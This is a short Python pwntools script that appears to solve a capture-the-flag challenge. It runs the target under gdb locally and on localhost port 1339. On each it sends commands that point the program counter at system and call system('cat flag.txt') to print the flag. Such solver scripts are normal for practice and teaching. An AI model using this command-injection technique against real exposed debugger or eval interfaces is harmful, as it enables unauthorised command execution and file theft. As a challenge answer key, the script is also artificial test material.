#!/usr/bin/env python3
from pwn import *
import re
import sys

context.arch = 'amd64'
context.log_level = 'info'

def run_exploit(r, mode_name):
    try:
        r.recvuntil(b"The GATE is closed", timeout=5)
        log.info(f"[{mode_name}] Sending exploit...")
        
        # 1. Point PC to system
        r.sendline(b'set $pc = (void*)system')
        
        # 2. Call system("cat flag.txt")
        r.sendline(b'call (void)$pc("cat flag.txt")')
        
        # Receive output
        output = r.recvall(timeout=3).decode(errors='ignore')
        
        if 'MOJO-JOJO{' in output:
            flag = re.search(r'MOJO-JOJO\{.*?\}', output).group(0)
            log.success(f"[{mode_name}] SUCCESS! Flag: {flag}")
            return True
        else:
            log.failure(f"[{mode_name}] Flag not found. Output:\n{output}")
            return False
    except Exception as e:
        log.error(f"[{mode_name}] Error during exploit: {e}")
        return False
    finally:
        r.close()

def solve():
    print("=== LOCAL VERIFICATION ===")
    r_local = process(['gdb', '-nx', '-q', '-x', 'gdbinit', './target'])
    local_res = run_exploit(r_local, "LOCAL")

    print("\n=== REMOTE VERIFICATION ===")
    try:
        r_remote = remote('localhost', 1339)
        remote_res = run_exploit(r_remote, "REMOTE")
    except Exception as e:
        log.error(f"Could not connect to remote: {e}")
        remote_res = False

    if local_res and remote_res:
        print("\n[+] BOTH VERIFICATIONS PASSED!")
    else:
        print("\n[-] VERIFICATION FAILED!")
        sys.exit(1)

if __name__ == "__main__":
    solve()
